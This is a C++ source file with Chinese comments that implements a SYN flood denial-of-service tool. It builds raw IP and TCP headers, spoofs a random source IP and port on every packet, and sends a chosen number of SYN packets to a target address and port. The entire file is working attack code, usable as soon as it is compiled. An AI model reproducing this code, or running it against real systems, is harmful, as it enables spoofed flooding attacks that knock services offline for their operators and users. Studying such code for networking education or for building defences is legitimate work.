#include <iostream>
#include <sys/socket.h>     // for socket
#include <sys/types.h>      // for socket
#include <netinet/in.h>     // for sockaddr_in
#include <netinet/tcp.h>    // for tcp
#include <netinet/ip.h>     // for ip
#include <arpa/inet.h>      // for inet_
#include <net/if.h>         // for ifreq
#include <memory.h>         // for memset
#include <unistd.h>         // for usleep

using namespace std;

u_int16_t check_sum(u_int16_t *buffer, int size)
{
    //建议将变量放入寄存器, 提高处理效率.
    register int len = size;
    //16bit
    register u_int16_t *p = buffer;
    //32bit
    register u_int32_t sum = 0;

    //16bit求和
    while( len >= 2)
    {
        sum += *(p++)&0x0000ffff;
        len -= 2;
    }

    //最后的单字节直接求和
    if( len == 1){
        sum += *((u_int8_t *)p);
    }

    //高16bit与低16bit求和, 直到高16bit为0
    while((sum&0xffff0000) != 0){
        sum = (sum>>16) + (sum&0x0000ffff);
    }
    return (u_int16_t)(~sum);
}

int main(int argc,char *argv[])
{
    if(argc!=4){
        cout << "error args,you should input: sudo ./synFlood [src_addr] [src_port] [attack_num]" << endl;
        return 0;
    }

    //目标地址
    string ip_addr = argv[1];

    //目标端口
    int port = atoi(argv[2]);

    //攻击次数
    unsigned int attack_num = atoi(argv[3]);

    srandom(time(nullptr));

    // 创建对方地址信息
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(ip_addr.c_str());
    addr.sin_port = htons(port);

    // 创建原始套接字,TCP
    int socket_fd = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
    if(socket_fd<0){
        perror("socket:");
        return 0;
    }
    cout << "sock:" << socket_fd  << endl;

    // 防止自动填充数据包
    int on = 1;
    int opt =  setsockopt(socket_fd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));
    if(opt<0){
        perror("opt:");
        return 0;
    }

    // 创建数据报buffer(IP首部+TCP首部+TCP数据部分)
    unsigned int len = sizeof(struct ip)+sizeof(struct tcphdr);
    unsigned char buffer[len];
    memset(&buffer,0,sizeof(buffer));
    cout << "buffer size :" << len << endl;

    // 构建IP首部和TCP首部
    struct ip *ip;
    struct tcphdr *tcp;
    ip = (struct ip *)buffer;
    tcp = (struct tcphdr *)(buffer+sizeof(struct ip));//ip首部后面就是tcp报文段了

    /*封装ip首部*/
    // 版本 4
    ip->ip_v = IPVERSION;
    // 首部长度 4
    ip->ip_hl = sizeof(struct ip)>>2;
    // 服务类型(types of service) 8
    ip->ip_tos = 0;
    // 总长度 16
    ip->ip_len = htons(len);
    // 标识 16
    ip->ip_id = 0;
    // 标志+偏移 16
    ip->ip_off = 0;
    // 生存时间 8
    ip->ip_ttl = 0;
    // 协议 8
    ip->ip_p = IPPROTO_TCP;
    // 首部检验和 16
    ip->ip_sum = 0;
    // 源地址(可伪造) 32
    //ip->ip_src.s_addr = inet_addr("127.0.0.1");
    // 目的地址 32
    ip->ip_dst = addr.sin_addr;

    /*封装tcp首部*/
    // 源端口 16 , 在syn攻击部分随机伪造端口
    //tcp->source = htons(m_port);
    // 目的端口 16
    tcp->dest = addr.sin_port;
    // 序号 32
    tcp->seq = 0;
    // 确认号 32
    tcp->ack_seq = 0;
    // 数据偏移 4
    //tcp->res1 = 0;
    // 保留 4
    tcp->doff = 5;  // 这里从wireshark来看是指的是数据偏移，resl和doff的位置反了，不知道是头文件有问题还是什么的，应该不是大小端问题。
    //res2+urg+ack+psh+rst+syn+fin 8
    //tcp->res2 = 0;
    //tcp->urg = 0;
    //tcp->ack = 0;
    //tcp->psh = 0;
    //tcp->rst = 0;
    tcp->syn = 1;
    //tcp->fin = 0;
    // 窗口 16
    //tcp->window = 0;
    // 检验和 16
    tcp->check = 0;
    // 紧急指针 16
    //tcp->urg_ptr = 0;

    /*synFlood*/
    for(unsigned int i = 0 ; i < attack_num ; i++){
        // 伪造ip源地址
        u_int32_t m_ip = random();
        ip->ip_src.s_addr = htonl(m_ip);

        // 伪造tcp源端口
        tcp->source = htons(random());

        cout << "[伪造信息]ip:" << inet_ntoa(ip->ip_src) << " port:" << tcp->source << endl;

        /*计算tcp校验和*/
        ip->ip_ttl = 0;
        tcp->check = 0;

        // ip首部的校验和，内核会自动计算，可先作为伪首部，存放tcp长度
        ip->ip_sum = htons(sizeof(struct tcphdr));

        // 计算tcp校验和，从伪首部开始
        tcp->check = check_sum((u_int16_t *)buffer+4,sizeof(buffer)-8);

        ip->ip_ttl = MAXTTL;
        // 发送
        int res =  sendto(socket_fd,buffer,len,0,(sockaddr *)&addr,sizeof(struct sockaddr_in)) ;
        cout << res << endl;
        if(res<0){
            perror("res");
            return 0;
        }
        usleep(10000);
    }
    cout << "done." << endl;
    return 0;
}